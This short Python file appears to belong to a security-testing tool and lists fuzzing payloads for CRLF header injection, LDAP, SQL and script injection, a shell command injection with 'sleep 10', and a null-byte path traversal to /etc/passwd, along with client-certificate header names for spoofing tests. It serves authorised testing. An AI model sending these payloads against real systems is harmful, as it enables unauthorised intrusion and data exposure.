ATTACK_PAYLOADS = [
  "%20",
  "0",
  "null",
  " ",
  "\r\n\r\nHello World",
  "Foo\r\n\r\nHello World",
  "Foo\0\r\n\r\nHello World\n",
  "\r\nHeader: Test",
  "\r\nDate: Wed, 14 May 1337 21:50:03 GMT",
  ",serialNumber=1337,",
  ",`~!@#$%^&*()_-+|}{[]\"':;<>,./?\\",
  "';return 'a'=='a' && ''=='",
  "*)(uid=*))(|(uid=*", 
  "*",
  "*(|(objectclass=*))",
  "*)(&",
  f"'\"; sleep 10; echo ",
  "foo\x00/../../../../../../etc/passwd",
  "' OR '1'='1",
  "´ OR ´1´=´1´; -- ",
  "\" OR 1=1/*",
  " OR 1=1 #"
]


CERT_HEADERS = [
  "ssl-client-cert",
  "X-Client-Cert",
  "X-Client-Certificate",
  "X-Client-Crt",
  "X-SSL-CERT",
  "X-SSL-Client-Cert",
  "SSLClientCertb64",
  "X-Forwarded-Tls-Client-Cert",
  "Client-Cert",
  "X-ARR-ClientCert",
  "X-Forwarded-Client-Cert"
]
